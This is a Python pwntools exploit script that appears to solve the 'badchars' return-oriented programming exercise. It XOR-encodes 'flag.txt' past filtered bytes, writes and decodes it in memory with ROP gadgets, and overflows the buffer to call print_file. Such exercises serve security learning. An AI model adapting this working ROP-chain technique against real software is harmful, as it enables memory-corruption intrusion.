from pwn import *
elf = context.binary = ELF('./badchars', checksec=False)
p = process()
info(p.recvline_contains('badchars are'))

rop = ROP(elf)

# Address of .data section (size=10 bytes)
data_section_address = elf.symbols.data_start + 8  # ???
info("%#x data_section_address", data_section_address)
pop_r12_r13_r14_r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"])[0]
mov_r13_r12 = elf.symbols.usefulGadgets + 12  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all
# Pop XOR value (1 byte) into r14 and .data memory address into r15
pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]  # pop r14; pop r15; ret;
# XOR value pointed to by r15 with r14
xor_r15_r14 = elf.symbols.usefulGadgets  # xor byte ptr [r15], r14b; ret;

value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)

xor_xploit = b""
data_addr_offset = 0
for c in xored_string:
    xor_xploit += pack(pop_r14_r15)
    xor_xploit += pack(value_to_xor_with)
    xor_xploit += pack(data_section_address + data_addr_offset)
    xor_xploit += pack(xor_r15_r14)
    data_addr_offset += 1
rop.raw([pop_r12_r13_r14_r15, xored_string, data_section_address, 0x0, 0x0, mov_r13_r12, xor_xploit])
# Call print file function with data section address as param
rop.print_file(data_section_address)

rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

payload = flat({
    40: rop_chain
})
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')
flag = p.recv()
success(flag)